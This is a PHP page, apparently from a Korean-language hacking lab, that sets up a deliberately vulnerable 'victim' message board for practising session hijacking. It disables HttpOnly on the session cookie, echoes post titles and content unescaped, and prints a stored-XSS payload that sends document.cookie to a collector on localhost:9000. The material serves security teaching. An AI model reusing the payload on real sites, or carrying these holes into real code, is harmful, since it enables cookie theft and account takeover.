<?php
session_set_cookie_params([
  'lifetime' => 3600,
  'httponly' => false, // ❌ 취약: JS로 쿠키 접근 가능
  'samesite' => 'Lax'
]);
session_start();
header('Content-Type: text/html; charset=UTF-8');

if (!isset($_SESSION['user'])) {
  header('Location: login.php');
  exit;
}

$db = new PDO('sqlite:' . __DIR__ . '/victim.sqlite');
$db->exec("CREATE TABLE IF NOT EXISTS posts (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  author TEXT, title TEXT, content TEXT,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

// 글 등록
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $title = $_POST['title'] ?? '';
  $content = $_POST['content'] ?? '';
  if ($title) {
    $stmt = $db->prepare("INSERT INTO posts (author, title, content) VALUES (?, ?, ?)");
    $stmt->execute([$_SESSION['user'], $title, $content]);
  }
  header('Location: mypage.php');
  exit;
}

$posts = $db->query("SELECT * FROM posts ORDER BY id DESC")->fetchAll(PDO::FETCH_ASSOC);
$username = $_SESSION['user'];
?>
<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>[피해자 앱] 마이페이지</title>
  <style>
    body { font-family: monospace; max-width: 800px; margin: 40px auto; padding: 20px; }
    .vuln { background: #ffe0e0; border: 2px solid #c00; padding: 10px; border-radius: 4px; }
    .box { background: #f5f5f5; padding: 15px; margin: 15px 0; border-radius: 4px; }
    code { background: #eee; padding: 2px 6px; font-size: 0.85em; }
    table { width: 100%; border-collapse: collapse; margin-top: 10px; }
    th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
    th { background: #eee; }
    form input, form textarea { width: 100%; padding: 6px; box-sizing: border-box; margin: 4px 0; }
    form textarea { height: 80px; font-family: monospace; }
    form button { padding: 8px 20px; cursor: pointer; }
    .header { display: flex; justify-content: space-between; align-items: center; }
    a { color: #c00; }
  </style>
</head>
<body>
  <div class="header">
    <h2>피해자 앱 - 게시판</h2>
    <div>
      <strong><?php echo htmlspecialchars($username); ?></strong>님 로그인 중
      | <a href="logout.php">로그아웃</a>
    </div>
  </div>

  <div class="vuln">
    ⚠️ <strong>세션 하이재킹 실습</strong><br>
    현재 세션 쿠키: <code id="cookieDisplay"></code><br>
    HttpOnly=false이므로 JS로 읽을 수 있습니다. 콘솔에서 <code>document.cookie</code> 확인
  </div>

  <div class="box">
    <h3>공격 흐름</h3>
    <ol>
      <li>아래 게시판에 XSS 페이로드 등록 (공격자 역할)</li>
      <li>피해자가 페이지 접근 시 쿠키 탈취 자동 실행</li>
      <li>공격자 수집 서버 (<code>localhost:9000</code>) log.txt 확인</li>
      <li>탈취한 세션 ID로 브라우저 쿠키 조작 → 피해자 계정 접근</li>
    </ol>
    <p>공격 페이로드 (제목 또는 내용에 입력):</p>
    <code>&lt;script&gt;new Image().src="http://localhost:9000/collector.php?c="+document.cookie&lt;/script&gt;</code>
  </div>

  <h3>글 작성</h3>
  <form method="POST">
    <label>제목:</label>
    <input type="text" name="title" placeholder="XSS 페이로드를 여기에 입력하세요" required>
    <label>내용:</label>
    <textarea name="content" placeholder="내용 입력"></textarea>
    <button type="submit">등록</button>
  </form>

  <h3>게시글 목록</h3>
  <?php if (empty($posts)): ?>
    <p>등록된 글이 없습니다.</p>
  <?php else: ?>
  <table>
    <tr><th>#</th><th>작성자</th><th>제목</th><th>내용</th></tr>
    <?php foreach ($posts as $post): ?>
    <tr>
      <td><?php echo $post['id']; ?></td>
      <td><?php echo htmlspecialchars($post['author']); ?></td>
      <!-- ❌ 취약: 제목과 내용을 그대로 출력 -->
      <td><?php echo $post['title']; ?></td>
      <td><?php echo $post['content']; ?></td>
    </tr>
    <?php endforeach; ?>
  </table>
  <?php endif; ?>

  <script>
    // 현재 세션 쿠키를 화면에 표시 (HttpOnly=false이므로 가능)
    document.getElementById('cookieDisplay').textContent = document.cookie || '(쿠키 없음)';
  </script>
</body>
</html>
